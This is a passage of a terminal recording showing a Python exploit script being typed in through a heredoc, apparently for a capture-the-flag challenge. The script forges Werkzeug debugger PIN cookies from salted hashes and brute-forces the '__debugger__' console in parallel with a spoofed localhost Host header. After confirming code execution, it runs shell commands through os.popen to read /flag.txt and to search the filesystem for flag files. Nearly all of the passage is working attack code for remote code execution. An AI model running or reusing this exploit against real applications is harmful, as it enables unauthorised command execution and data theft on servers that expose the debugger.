[2393.784026, "o", "\u001b[?2004h> "]
[2393.784175, "o", "                            h_name.update(b'cookiesalt')\r\n\u001b[?2004l\r"]
[2393.784246, "o", "\u001b[?2004h> "]
[2393.784452, "o", "                            cookie_name = f\"__wzd{h_name.hexdigest()[:20]}\"\r\n\u001b[?2004l\r"]
[2393.784535, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r"]
[2393.784612, "o", "\u001b[?2004h> "]
[2393.784705, "o", "                            h_pin = h.copy()\r\n\u001b[?2004l\r"]
[2393.784789, "o", "\u001b[?2004h> "]
[2393.784918, "o", "                            h_pin.update(b'pinsalt')\r\n\u001b[?2004l\r"]
[2393.784986, "o", "\u001b[?2004h> "]
[2393.78518, "o", "                            num = f\"{int(h_pin.hexdigest(), 16):09d}\"[:9]\r\n\u001b[?2004l\r"]
[2393.785249, "o", "\u001b[?2004h> "]
[2393.785429, "o", "                            pin = f\"{num[:3]}-{num[3:6]}-{num[6:9]}\"\r\n\u001b[?2004l\r"]
[2393.785502, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[2393.785569, "o", "> "]
[2393.785787, "o", "                            for cval_algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:\r\n\u001b[?2004l\r"]
[2393.785855, "o", "\u001b[?2004h> "]
[2393.786105, "o", "                                c_val = cval_algo(f\"{pin} pallets\".encode('utf-8')).hexdigest()\r\n\u001b[?2004l\r"]
[2393.786172, "o", "\u001b[?2004h> "]
[2393.786376, "o", "                                cookies_to_test.append((cookie_name, c_val))\r\n\u001b[?2004l\r"]
[2393.786445, "o", "\u001b[?2004h> "]
[2393.786555, "o", "                        except Exception:\r\n\u001b[?2004l\r"]
[2393.786624, "o", "\u001b[?2004h> "]
[2393.786713, "o", "                            pass\r\n\u001b[?2004l\r"]
[2393.786786, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[2393.786854, "o", "> "]
[2393.786967, "o", "print(\"Total payloads:\", len(cookies_to_test))\r\n\u001b[?2004l\r"]
[2393.787029, "o", "\u001b[?2004h> "]
[2393.7871, "o", "chunk_size = 50\r\n\u001b[?2004l\r\u001b[?2004h"]
[2393.787168, "o", "> "]
[2393.787412, "o", "chunks = [dict(cookies_to_test[i:i+chunk_size]) for i in range(0, len(cookies_to_test), chunk_size)]\r\n\u001b[?2004l\r"]
[2393.787485, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[2393.787554, "o", "> "]
[2393.787622, "o", "def test_chunk(chunk):\r\n\u001b[?2004l\r\u001b[?2004h> "]
[2393.788056, "o", "    r = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('PWN_9X')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies=chunk)\r\n\u001b[?2004l\r"]
[2393.788125, "o", "\u001b[?2004h> "]
[2393.788203, "o", "    if 'PWN_9X' in r.text:\r\n\u001b[?2004l\r"]
[2393.788271, "o", "\u001b[?2004h> "]
[2393.788366, "o", "        for k, v in chunk.items():\r\n\u001b[?2004l\r"]
[2393.788446, "o", "\u001b[?2004h> "]
[2393.788873, "o", "            r2 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('WIN_5Y')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\r\n\u001b[?2004l\r"]
[2393.788946, "o", "\u001b[?2004h> "]
[2393.789038, "o", "            if 'WIN_5Y' in r2.text:\r\n\u001b[?2004l\r"]
[2393.789106, "o", "\u001b[?2004h> "]
[2393.789264, "o", "                print(f\"\\n[*] EXPLOIT SUCCESS VIA {k}={v}\")\r\n\u001b[?2004l\r"]
[2393.789332, "o", "\u001b[?2004h> "]
[2393.789827, "o", "                cmd = \"import os; print(os.popen('cat /flag.txt 2>/dev/null; cat /app/flags.txt 2>/dev/null; find / -name \\\"*flag*\\\" 2>/dev/null | xargs -r cat 2>/dev/null').read())\"\r\n\u001b[?2004l\r"]
[2393.789902, "o", "\u001b[?2004h> "]
[2393.790299, "o", "                r3 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": cmd, \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\r\n\u001b[?2004l\r"]
[2393.790368, "o", "\u001b[?2004h> "]
[2393.790495, "o", "                print(\"FLAG OUTPUT:\", r3.text)\r\n\u001b[?2004l\r"]
[2393.790564, "o", "\u001b[?2004h> "]
[2393.790642, "o", "                return True\r\n\u001b[?2004l\r"]
[2393.790707, "o", "\u001b[?2004h> "]
[2393.790779, "o", "    return False\r\n\u001b[?2004l\r\u001b[?2004h"]
[2393.79085, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[2393.791042, "o", "with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:\r\n\u001b[?2004l\r"]
[2393.791114, "o", "\u001b[?2004h> "]
[2393.791228, "o", "    for _ in ex.map(test_chunk, chunks):\r\n\u001b[?2004l\r"]
[2393.791294, "o", "\u001b[?2004h> "]
[2393.791362, "o", "        pass\r\n\u001b[?2004l\r\u001b[?2004h> "]
[2393.791426, "o", "EOF\r\n\u001b[?2004l\r"]
